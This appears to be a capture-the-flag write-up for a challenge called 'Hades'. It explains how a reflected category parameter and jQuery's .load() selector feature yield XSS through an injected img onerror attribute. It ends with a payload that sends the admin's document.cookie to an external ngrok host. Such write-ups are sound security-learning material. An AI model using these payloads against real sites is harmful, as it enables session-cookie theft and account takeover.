<hr />

<h2>description: jQuery-facilitated XSS</h2>

<h1>Hades</h1>

<h2>Overview</h2>

<blockquote>
  <p>Don't stop retrying!</p>
</blockquote>

<p>This is basically a site that uses jQuery a bunch of AJAX requests to dynamically load the page content. For example, let's load the "news" category at <code>?cat=news</code>.</p>

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-20 at 2.25.48 PM.png" alt=""><figcaption></figcaption></figure>

<p>Observing the HTML response, the <code>news</code> string is reflected twice in the JavaScript.</p>

<p>```markup</p>

<script>
  console.log('cat in url');
  $('#ajax-load').load('/ajax/articles?cat=news');
  $('.search-filter ul li.tag').removeClass('active');
  $('.search-filter ul li[data-id="news"]').addClass('active');
  $('.search-filter ul li.tag').click(function() {
    $('.search-filter ul li.tag').removeClass('active');
    $(this).addClass('active');
    $('#ajax-load').html('<hr/><div class="loading"></div><hr/>');
    $('#ajax-load').load('/ajax/articles-results?cat=' + $(this).data('id'));
  });
</script>

<p>```</p>

<p>Trying to use a single quote to break out of the string (<code>/?cat=news'</code>) doesn't work - a <code>\</code> is prepended to it.</p>

<p><code>javascript
$('#ajax-load').load('/ajax/articles?cat=news\'');
</code></p>

<p>After doing some testing, I found that the <code>\</code> character isn't escaped and <code>/?cat=news\\'</code> breaks out of the string.</p>

<p>However, because any <code>()</code> characters are removed and subsequent quotes are still escaped, I couldn't produce valid JavaScript after breaking out of the string.</p>

<p><code>javascript
$('#ajax-load').load('/ajax/articles?cat=test\\'+alert``');
$('.search-filter ul li.tag').removeClass('active');
$('.search-filter ul li[data-id="test\\'+alert``"]').addClass('active');
</code></p>

<p>It seems that we need to find another way to achieve XSS.</p>

<h2>Getting XSS</h2>

<p>The first line of the JavaScript tells jQuery to fetch <code>/ajax/articles?cat=news</code> and set its contents as the HTML of the <code>#ajax-load</code> element.</p>

<p><code>javascript
$('#ajax-load').load('/ajax/articles?cat=news');
</code></p>

<p>Because we also control the <code>cat</code> parameter in this second request, we can try to find a HTML injection vector in <code>/ajax/articles</code> and inject it into <code>#ajax-load</code>.</p>

<p>The following request</p>

<p><code>
/ajax/articles?cat=asdf"x="
</code></p>

<p>injects an attribute into the <code>&lt;img&gt;</code> element in the response.</p>

<p>```markup</p>

<noscript>
    If you can't see anything, you have to enable javascript
    <img src="/images/error.jpg" alt="selected category asdf"x="" />
</noscript>

<p>```</p>

<p>Looking at jQuery's <a href="https://api.jquery.com/load/"><code>.load()</code> documentation</a>, we find an interesting feature that allows us to specify a specific portion of the remote document that we want to insert.</p>

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-20 at 2.55.38 PM.png" alt=""><figcaption></figcaption></figure>

<p>This allows us to get rid of the pesky <code>&lt;noscript&gt;</code> tag end <em>only</em> load the <code>&lt;img&gt;</code> element inside.</p>

<p><code>
/?cat=random"onerror="alert`` img
</code></p>

<p>will render</p>

<p><code>markup
&lt;img src="/images/error.jpg" alt="selected category random"onerror="alert``" /&gt;
</code></p>

<p>and give us XSS.</p>

<p>We can use the following payload to steal the admin's cookie and get the flag.</p>

<p>{% code overflow="wrap" %}
<code>
/?cat=random"onerror="window.location=`https://f5e6-49-245-33-142.ngrok.io?${document.cookie}` img 
</code>
{% endcode %}</p>
